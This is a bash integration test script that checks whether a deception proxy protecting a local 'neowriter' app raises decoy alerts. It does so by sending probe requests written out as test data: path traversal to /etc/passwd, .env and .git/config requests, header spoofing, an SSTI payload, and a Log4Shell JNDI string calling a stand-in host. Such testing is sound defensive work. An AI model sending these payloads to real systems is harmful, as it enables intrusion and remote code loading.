#!/bin/bash
# Run integration tests against neowriter protected by cloud-active-defense minimal stack.
# Prerequisites: run ./setup-neowriter.sh first to clone the neowriter repo.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

COMPOSE_FILE="docker-compose.neowriter.yaml"
export COMPOSE_FILE
PROXY="http://localhost:8000"

if [ ! -d "$SCRIPT_DIR/neowriter" ]; then
  echo "neowriter not found. Run ./setup-neowriter.sh first."
  exit 1
fi

echo "Starting neowriter stack..."
docker compose -f "$COMPOSE_FILE" down --remove-orphans 2>/dev/null || true
docker compose -f "$COMPOSE_FILE" up -d --build

echo "Waiting for proxy to be ready..."
for i in $(seq 1 30); do
  if curl -sf "$PROXY/" > /dev/null 2>&1; then
    echo "Proxy ready."
    break
  fi
  if [ "$i" -eq 30 ]; then
    echo "Proxy did not become ready in time. Check: docker compose -f $COMPOSE_FILE logs"
    docker compose -f "$COMPOSE_FILE" down
    exit 1
  fi
  sleep 2
done

echo ""
echo "=== Neowriter Integration Tests ==="

passed=0
failed=0

check_decoy_alert() {
  local name="$1"
  local decoy_key="$2"
  if docker compose -f "$COMPOSE_FILE" logs proxy --since 10s 2>&1 | grep -q "\"DecoyKey\":\"$decoy_key\""; then
    echo -e "\033[0;32mPASS\033[0m $name"
    ((passed++))
  else
    echo -e "\033[0;31mFAIL\033[0m $name"
    ((failed++))
  fi
}

# 1-A: CDN path traversal lure — visit the injected URL
curl -s "$PROXY/cdn/assets/../admin/config" > /dev/null; sleep 1
check_decoy_alert "1-A CDN/path-traversal lure" "/cdn/assets/../admin/config"

# 1-B: Admin panel URL probe
curl -s "$PROXY/admin/panel" > /dev/null; sleep 1
check_decoy_alert "1-B Admin panel probe" "/admin/panel"

# 1-C: Export endpoint probe
curl -s "$PROXY/api/export/all" > /dev/null; sleep 1
check_decoy_alert "1-C Export endpoint probe" "/api/export/all"

# 1-D: Internal config probe
curl -s "$PROXY/internal/config" > /dev/null; sleep 1
check_decoy_alert "1-D Internal config probe" "/internal/config"

# 2-A: .env file probe
curl -s "$PROXY/.env" > /dev/null; sleep 1
check_decoy_alert "2-A .env file probe" "/.env"

# 4-A: X-Forwarded-For header spoofing
curl -s -H "X-Forwarded-For: 127.0.0.1" "$PROXY/" > /dev/null; sleep 1
check_decoy_alert "4-A X-Forwarded-For spoof" "X-Forwarded-For"

# 4-C: X-Original-URL header manipulation
curl -s -H "X-Original-URL: /admin" "$PROXY/" > /dev/null; sleep 1
check_decoy_alert "4-C X-Original-URL probe" "X-Original-URL"

# 6-A: Path traversal in URL
curl -s "$PROXY/files/../etc/passwd" > /dev/null; sleep 1
check_decoy_alert "6-A Path traversal in URL" "../etc/passwd"

# 7-A: SSTI via GET param
curl -s "$PROXY/?template=%7B%7B7*7%7D%7D" > /dev/null; sleep 1
check_decoy_alert "7-A SSTI via GET param" "template"

# 10-B: .git probe
curl -s "$PROXY/.git/config" > /dev/null; sleep 1
check_decoy_alert "10-B .git probe" "/.git"

# 10-C: wp-admin probe
curl -s "$PROXY/wp-admin" > /dev/null; sleep 1
check_decoy_alert "10-C wp-admin probe" "/wp-admin"

# L4J-1: Log4Shell via User-Agent
curl -s -H 'User-Agent: ${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 1
check_decoy_alert "L4J-1 Log4Shell User-Agent" "User-Agent"

echo ""
echo "=== Results: $passed passed, $failed failed ==="

echo "Stopping stack..."
docker compose -f "$COMPOSE_FILE" down

if [ "$failed" -gt 0 ]; then
  exit 1
fi
